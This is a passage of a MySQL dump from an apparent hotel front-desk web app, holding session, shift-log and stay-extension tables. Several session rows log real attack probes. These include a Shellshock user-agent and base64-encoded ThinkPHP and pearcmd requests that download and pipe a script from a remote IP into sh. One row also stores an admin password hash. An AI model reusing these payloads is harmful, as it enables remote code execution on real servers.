+https://about.censys.io/)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUUNiTUg5VGltbTlvUjhtdGx3YVNQRTRBbGh3N2VFNkw2eGl6aENwaiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjc6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9sb2dpbiI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763783291),('sfkATQuAmN1SRClZQi2A5RgIFKMe0AUAyC1NOT2S',NULL,'192.159.99.95','Mozilla/5.0 (rondo2012@atomicmail.io)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiT2h2eXVnQkR5cU9ydWI5eGlPRDRJYkFGclRBTG4zYTR3dThJTmJWYSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzQxOiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwP2Z1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnM9JTJGSW5kZXglMkYlNUN0aGluayU1Q2FwcCUyRmludm9rZWZ1bmN0aW9uJnZhcnMlNUIwJTVEPXN5c3RlbSZ2YXJzJTVCMSU1RCU1QjAlNUQ9JTI4d2dldCUyMC1xTy0lMjBodHRwJTNBJTJGJTJGNzQuMTk0LjE5MS41MiUyRnJvbmRvLnR4Zy5zaCU3QyU3Q2J1c3lib3glMjB3Z2V0JTIwLXFPLSUyMGh0dHAlM0ElMkYlMkY3NC4xOTQuMTkxLjUyJTJGcm9uZG8udHhnLnNoJTdDJTdDY3VybCUyMC1zJTIwaHR0cCUzQSUyRiUyRjc0LjE5NC4xOTEuNTIlMkZyb25kby50eGcuc2glMjklN0NzaCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763784392),('sznJnZsfQLOZoYq2IuFdt9bgVnqAAaAvdKCpZwBf',NULL,'87.121.84.52','Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTkZISDNoaTFNd2pldFBOREJnMnNzY0JwVmZ1cTR2dVNnNnNjdEFpcyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763729632),('t5fiRtv0Gik2F4kt5Sdt9ExktlYq6u5FR5kJ9dWs',NULL,'1.37.67.196','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoibnFpaTlndDJWQ2pSbXZWaDVzSDNpUzlOeHJaSDZBbXZzRVpqamR5VSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763727584),('TgoyQtYS2gu6tLnME3EZs9NFrQ0sZHT3WTAAYWar',NULL,'185.238.231.26','python-requests/2.32.3','YTozOntzOjY6Il90b2tlbiI7czo0MDoiZkhaMXdwbGlIemVRSWgybVloZzBFQWhNMmJaektVbnphNGVrbkpvZCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDk6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC8/JTNDcGxheSUzRXdpdGhtZSUzQyUyRiUzRT0iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763742052),('ttpwdDLNfSybUVueXSbxQ1NPwfoAjotPDhi8Qsvy',NULL,'212.11.64.45','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoiUDB2WkI2M29LRDhkTEVTVzhHMlFZazU3ZjVuU1RYck1ManhRQktxUSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763747141),('txGaNNIrFhckyDPRRw9QgcT13XBZKcHlj2VEICkS',NULL,'177.43.59.131','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTGFaNEppa1d3amJUdDhUalRKZnF5WVpCajlUb0RVVThXbDJ1Ujk5ViI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjAwOiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwPyUyRiUzQyUzRmVjaG8lMjhtZDUlMjglMjJoaSUyMiUyOSUyOSUzQiUzRiUzRSUyMCUyRnRtcCUyRmluZGV4MS5waHA9JmNvbmZpZy1jcmVhdGUlMjAlMkY9Jmxhbmc9Li4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRnVzciUyRmxvY2FsJTJGbGliJTJGcGhwJTJGcGVhcmNtZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763791382),('TZrI628h7aQgdUH969qm4CimhGlU9Ix5GnCnhrbA',2,'165.99.250.28','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTo1OntzOjY6Il90b2tlbiI7czo0MDoiZk1oeHJ4SEpJSzRxWThUTTQ2THVBWFF6VDRrTzZNakF1d0pMTzlBYyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MzM6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9hZG1pbi9yYXRlcyI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fXM6NTA6ImxvZ2luX3dlYl81OWJhMzZhZGRjMmIyZjk0MDE1ODBmMDE0YzdmNThlYTRlMzA5ODlkIjtpOjI7czoyMToicGFzc3dvcmRfaGFzaF9zYW5jdHVtIjtzOjYwOiIkMnkkMTAkVXhzczhhNUNHU3Y2djRiSU9URE8wZTV5QW5UeS9mcWFGWENQSGltYUlxT21lY3c5RmVMTHUiO30=',1763732208),('U0vcnIKSLzYUEEEMptQOpGAWFyWdiuJ7R5vgwz7q',NULL,'194.42.196.91','Go-http-client/1.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOHNvU0VYV3pBZlZqbGN5UFBoajV5VEdKUENta0dvdlhTOHJjeW8zaSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763770512),('UeiqtKisTyWQVc6qjvcWPD6aTaJzugTSDwoHvQMo',NULL,'170.106.140.110','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1','YTozOntzOjY6Il90b2tlbiI7czo0MDoibFkydVBSNEx6YXVTVGRweDR0OFZyclJJejNzblpqcGlVc0NiQXZ5bSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763740605),('URwBsVt1ZFOLMCPMc5CHGfjuNCGC4ghL5L2CDn1e',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZkdIWjZmbFdRV3J0S3N0azlGVFJYQ0lVWmkzd056UHhTSExhRk91eSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763803819),('UrZu6IQA8um2Vm6V7Rt3XGpAnnMnFRsyVt44tYD8',NULL,'69.171.234.41','facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiU3VGOXZNSEdZbXoya2RIYktmUVFsSWxpWmtOVzZBbmFGNTNDUHVDbCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763731840),('Ut0YGK0yTJf64Fedo8DxSbxK9wJPUIF8TdP6ah0L',NULL,'192.159.99.95','() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\"& # rondo2012@atomicmail.io','YTozOntzOjY6Il90b2tlbiI7czo0MDoiMk40S1dVTlpyam1sVFpVMTMyZ1dGZWtoS2U4VDF4ZGhKSEJjZXhSViI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763777079),('v44a7V8bGg3GuFmBYrvPEEZxH9UX4qxCriqOxiCi',NULL,'162.216.149.183','Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity','YTozOntzOjY6Il90b2tlbiI7czo0MDoiblFRaVJFYktKTjZKbDc0S1l6ckVBWGUyWEhmQW9OSFNHZ21hYVhrSiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763767846),('vF03K0tDLHz5H7q9wDnnvKvVw80uHzaOKDk7W7DK',NULL,'202.64.45.197','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOGhVQXFES3NQeXpBeXhBeW8yQUNWbGJXdmZnZkVTeTBaaWRJbjE1aCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjAwOiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwPyUyRiUzQyUzRmVjaG8lMjhtZDUlMjglMjJoaSUyMiUyOSUyOSUzQiUzRiUzRSUyMCUyRnRtcCUyRmluZGV4MS5waHA9JmNvbmZpZy1jcmVhdGUlMjAlMkY9Jmxhbmc9Li4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRnVzciUyRmxvY2FsJTJGbGliJTJGcGhwJTJGcGVhcmNtZCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763730759),('Vif0X2dteoJPKdisPFE6C9LX3DpR8fkOvY30I7DE',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiZVFWSEV6VE5OOHBkcVJwTDBIRXpyWGR6a2pvY05kbVc5UVVZR0c4UyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763726923),('VkzhXuTRbogrtUpMhFrkiaNXEC0hqUKCPeN3PUlp',NULL,'202.64.45.197','libredtail-http','YTozOntzOjY6Il90b2tlbiI7czo0MDoiR1JUVEUyMFVsWXRuYzJvT1pBdW13VlhGYnhJYWFpY25jVmMzTWlSeSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTQ3OiJodHRwOi8vMTM5LjU5LjI1Mi4xMDAvaW5kZXgucGhwP2Z1bmN0aW9uPWNhbGxfdXNlcl9mdW5jX2FycmF5JnM9JTJGaW5kZXglMkYlNUN0aGluayU1Q2FwcCUyRmludm9rZWZ1bmN0aW9uJnZhcnMlNUIwJTVEPW1kNSZ2YXJzJTVCMSU1RCU1QjAlNUQ9SGVsbG8iO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19',1763730759),('vXx12j0XMOS66Md6Pkc9Fi2T0tyYDf1Jj0Cjo6si',NULL,'5.187.35.21','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiWXE0Q3F3OVZBQ0g1RXhvYTBTc01kM1lUTkozUzFYWkNqcFlxRHRXWCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763796499),('vYdwVTpFp6dEZvwKcV4ZQ8WcRvfMx2vlxiNZQSpm',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiaGo1T3JJYWxIbU43c0dEMExnREhENkJjWlJmWGR5STRhNGVUTW1OQyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763732076),('WDs7FOcm3sUdTWSO5El4Q7pLPe2x8SfNy2TLRZxS',NULL,'93.174.93.12','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17','YTozOntzOjY6Il90b2tlbiI7czo0MDoicDlyMlRhd3piREE0cnJDMDlmRTFEcGhyU213NVhOdFVScVNOQnlRQSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763757005),('WG0NyUdgRrRLmZc39H3Kb1ndhLu8k0e3JS8wHBj4',NULL,'154.26.135.9','Mozilla/5.0 (compatible; LaravelFinder/1.0)','YTozOntzOjY6Il90b2tlbiI7czo0MDoiblRJS25QZmRNSDU0cWl3VXBLazhzUmZ6UjRPRzIxUzN2MWR1dm5oZyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763785695),('wHRiIKvFcRhYC2dJQ8SuKe0wPnSdh38xPZbRIlnB',NULL,'185.242.226.113','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiaW1HNVlRaGtYRkJVd1FLY0YyWDN5U2JwblVNb2I1R2FOSEx0SnZCMCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763730755),('wU6wYyymV1LXvsJBlf74qaETJZzRsGaeQRRje2ki',NULL,'204.76.203.212','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiekNMYVIzb3htbHE5SFlLeVN1NFpodktjZFJiMlZzZWYzbFI5Z1o0dCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763742368),('XEwU7xFDLICsgRbgJquzTV9d9m96io0OSb5OaDQX',NULL,'168.76.20.229','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE','YTozOntzOjY6Il90b2tlbiI7czo0MDoic1pmU1NnNnZNOVRhQXBuYTAzMzB4N2F2TzZtSkhOQXZjcmdrdjQxZSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763785409),('XKPyuRPPkEbnmUTaBvhw9Klnqws46yTO4l5M4KJL',NULL,'65.49.20.69','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiS2hPMGp2dDFTUmRqQjBDb2VnaFhJVXhZenRrWkpIWVE3NlJlaW8ybCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763800838),('XmXduIf78URrqVeAdXcungsARVJWahfk0D4rGAfL',NULL,'103.125.40.175','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoianNkSlBXekxMdEtTeFZoa1JnT2FIbTZiR0J2bjdkelk5NnNPNnFXWSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763742980),('xrJQZAR7ss98ueOkLeZnuddydpTUcLo0de4Dwjjw',NULL,'193.142.147.209','','YTozOntzOjY6Il90b2tlbiI7czo0MDoiNEN1NWZrQzJITVZkeEZGVlhOWmZUSHdSem1HQXA4VmQ2R0VaWWU1QiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjE6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763762465),('zpzRyRRYGjd2TVtncAPQS3Cd0SZlHyfSXlysT9Km',NULL,'124.217.106.220','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36','YTozOntzOjY6Il90b2tlbiI7czo0MDoiTnBqbVRHbnBKUnYxNFdLOTFCSTQ2ckRFSmNPRFFzV1Q0cE9oNUR4TyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjc6Imh0dHA6Ly8xMzkuNTkuMjUyLjEwMC9sb2dpbiI7fX0=',1763727610);
/*!40000 ALTER TABLE `sessions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `shift_logs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `shift_logs` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `time_in` datetime NOT NULL,
  `time_out` datetime DEFAULT NULL,
  `frontdesk_ids` json NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `shift_logs` WRITE;
/*!40000 ALTER TABLE `shift_logs` DISABLE KEYS */;
INSERT INTO `shift_logs` VALUES (1,'2025-11-18 15:01:56',NULL,'[1, \"Tan\"]','2025-11-18 15:01:56','2025-11-18 15:01:56'),(2,'2025-11-19 15:06:18',NULL,'[2, \"sirok\"]','2025-11-19 15:06:18','2025-11-19 15:06:18'),(3,'2025-11-21 20:22:12',NULL,'[2, \"Bhong\"]','2025-11-21 20:22:12','2025-11-21 20:22:12');
/*!40000 ALTER TABLE `shift_logs` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `stay_extensions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `stay_extensions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `guest_id` bigint unsigned NOT NULL,
  `extension_id` bigint unsigned NOT NULL,
  `hours` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `amount` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `frontdesk_ids` json DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `stay_extensions` WRITE;
/*!40000 ALTER TABLE `stay_extensions` DISABLE KEYS */;
INSERT INTO `stay_extensions` VALUES (1,5,4,'24','1172','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:20:56','2025-11-18 15:20:56'),(2,6,4,'24','1060','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:22:35','2025-11-18 15:22:35'),(3,7,2,'12','200','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:26:02','2025-11-18 15:26:02'),(4,8,2,'12','200','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:27:55','2025-11-18 15:27:55'),(5,9,4,'24','1116','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:29:21','2025-11-18 15:29:21'),(6,10,1,'6','716','\"[1,\\\"Tan\\\"]\"','2025-11-18 15:34:56','2025-11-18 15:34:56'),(7,14,2,'12','200','\"[1,\\\"Tan\\\"]\"','2025-11-20 09:53:30','2025-11-20 09:53:30'),(8,15,1,'6','100','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:30:23','2025-11-20 10:30:23'),(9,15,1,'6','100','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:30:43','2025-11-20 10:30:43'),(10,15,1,'6','436','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:31:24','2025-11-20 10:31:24'),(11,15,3,'18','400','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:31:51','2025-11-20 10:31:51'),(12,16,2,'12','200','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:38:13','2025-11-20 10:38:13'),(13,16,2,'12','648','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:45:32','2025-11-20 10:45:32'),(14,16,1,'6','100','\"[1,\\\"Tan\\\"]\"','2025-11-20 10:46:03','2025-11-20 10:46:03'),(15,18,3,'18','492','\"[1,\\\"Tan\\\"]\"','2025-11-20 11:15:55','2025-11-20 11:15:55'),(16,21,1,'6','772','\"[1,\\\"Tan\\\"]\"','2025-11-20 12:01:54','2025-11-20 12:01:54'),(17,21,2,'12','200','\"[1,\\\"Tan\\\"]\"','2025-11-20 12:58:00','2025-11-20 12:58:00'),(18,20,1,'6','100','\"[1,\\\"Tan\\\"]\"','2025-11-20 12:58:17','2025-11-20 12:58:17'),(19,20,1,'6','100','\"[1,\\\"Tan\\\"]\"','2025-11-20 12:58:54','2025-11-20 12:58:54'),(20,27,4,'24','1172','\"[2,\\\"Bhong\\\"]\"','2025-11-21 20:34:30','2025-11-21 20:34:30'),(21,28,4,'24','1060','\"[2,\\\"Bhong\\\"]\"','2025-11-21 20:50:00','2025-11-21 20:50:00'),(22,29,2,'12','200','\"[2,\\\"Bhong\\\"]\"','2025-11-21 20:54:10','2025-11-21 20:54:10'),(23,30,2,'12','200','\"[2,\\\"Bhong\\\"]\"','2025-11-21 20:57:15','2025-11-21 20:57:15'),(24,31,4,'24','1116','\"[2,\\\"Bhong\\\"]\"','2025-11-21 21:00:09','2025-11-21 21:00:09'),(25,32,5,'3','666','\"[2,\\\"Bhong\\\"]\"','2025-11-21 21:06:06','2025-11-21 21:06:06'),(26,37,2,'12','760','\"[2,\\\"Bhong\\\"]\"','2025-11-21 21:37:10','2025-11-21 21:37:10'),(27,38,2,'12','760','\"[2,\\\"Bhong\\\"]\"','2025-11-21 21:40:25','2025-11-21 21:40:25');
/*!40000 ALTER TABLE `stay_extensions` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `staying_hours`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `staying_hours` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `number` int NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `staying_hours` WRITE;
/*!40000 ALTER TABLE `staying_hours` DISABLE KEYS */;
INSERT INTO `staying_hours` VALUES (1,1,6,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(2,1,12,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(3,1,18,'2025-11-18 14:23:00','2025-11-18 14:23:00'),(4,1,24,'2025-11-18 14:23:00','2025-11-18 14:23:00');
/*!40000 ALTER TABLE `staying_hours` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `temporary_check_in_kiosks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `temporary_check_in_kiosks` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `guest_id` bigint unsigned NOT NULL,
  `terminated_at` datetime NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=38 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `temporary_check_in_kiosks` WRITE;
/*!40000 ALTER TABLE `temporary_check_in_kiosks` DISABLE KEYS */;
/*!40000 ALTER TABLE `temporary_check_in_kiosks` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `temporary_reserveds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `temporary_reserveds` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `branch_id` bigint unsigned NOT NULL,
  `room_id` bigint unsigned NOT NULL,
  `guest_id` bigint unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

LOCK TABLES `temporary_reserveds` WRITE;
/*!40000 ALTER TABLE `temporary_reserveds` DISABLE KEYS */;
/*!40000 ALTER TABLE `temporary_reserveds` ENABLE KEYS */;
UNLOCK TABLES;
DROP TABLE IF EXISTS `transaction_types`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `transaction_types` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
